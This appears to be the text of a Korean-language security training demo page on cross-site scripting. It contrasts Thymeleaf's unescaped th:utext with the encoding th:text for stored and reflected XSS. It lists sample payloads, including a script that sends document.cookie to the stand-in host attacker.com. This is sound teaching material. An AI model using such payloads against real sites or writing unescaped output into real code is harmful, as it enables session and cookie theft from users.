XSS (Cross-Site Scripting)

악성 스크립트가 웹 페이지에 삽입되어 다른 사용자의 브라우저에서 실행됩니다.

OWASP A03:2021 - Injection CWE-79
Stored XSS (저장형)

입력값이 서버에 저장되고, 이후 모든 사용자 조회 시 실행됩니다. 가장 위험한 XSS 유형입니다.

[취약] th:utext — HTML 그대로 출력
공격 예시:
  • 경고창: <script>alert('XSS!')</script>
  • 쿠키 탈취: <script>fetch('http://attacker.com?c='+document.cookie)</script>
  • 이미지 태그: <img src=x onerror="alert('XSS')">
댓글 목록 (HTML 그대로 렌더링):
댓글 없음
실제 코드 (xss.html):
<span th:utext="${comment}"></span>
[안전] th:text — HTML 인코딩
방어 원리: th:text는 HTML 특수문자를 자동으로 인코딩합니다.
<script> → &lt;script&gt; (그대로 표시, 실행 안 됨)
댓글 목록 (HTML 인코딩 후 표시):
댓글 없음
실제 코드 (xss.html):
<span th:text="${comment}"></span> // th:text = HTML 인코딩 후 출력 → XSS 차단
Reflected XSS (반사형)

입력값이 저장 없이 즉시 응답에 반영되어 출력됩니다. URL을 통해 배포됩니다.

[취약] 반사형 XSS
URL 예시 (브라우저 주소창에 직접 입력):
/demo/xss/reflected?name=<script>alert(1)</script>
